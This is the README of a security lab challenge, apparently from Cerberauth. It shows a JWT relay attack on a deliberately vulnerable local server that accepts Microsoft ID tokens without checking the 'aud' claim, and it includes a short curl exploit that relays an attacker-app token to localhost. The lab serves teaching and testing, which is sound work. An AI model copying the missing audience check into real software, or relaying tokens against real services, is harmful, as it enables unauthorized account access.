# JWT Microsoft Token Relay Attack

This challenge demonstrates a token cross-service relay attack against a relying party that trusts Microsoft as its identity provider. The server verifies the RSA signature and the `iss` claim (`https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/v2.0`) against Microsoft's public key, but never validates the `aud` claim. Any ID token minted by Microsoft - including one issued for a completely different, attacker-registered application - is therefore accepted, even though it was never intended for this relying party (`aud: a4f8c2e1-9b3d-4f5a-8c6e-1d2f3a4b5c6d`).

## How to run it

```bash
go run main.go serve
```

## How to exploit it

```bash
# Attacker registers their own app with Microsoft and signs in through it,
# receiving a legitimately signed ID token scoped to their app (aud: e5f6a7b8-1c2d-4e3f-9a0b-2c3d4e5f6a7b)
TOKEN=$(go run main.go jwt-attacker-app)

# Relay that token to the victim relying party - the audience is never
# checked, so the token is accepted as if it were issued for it
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
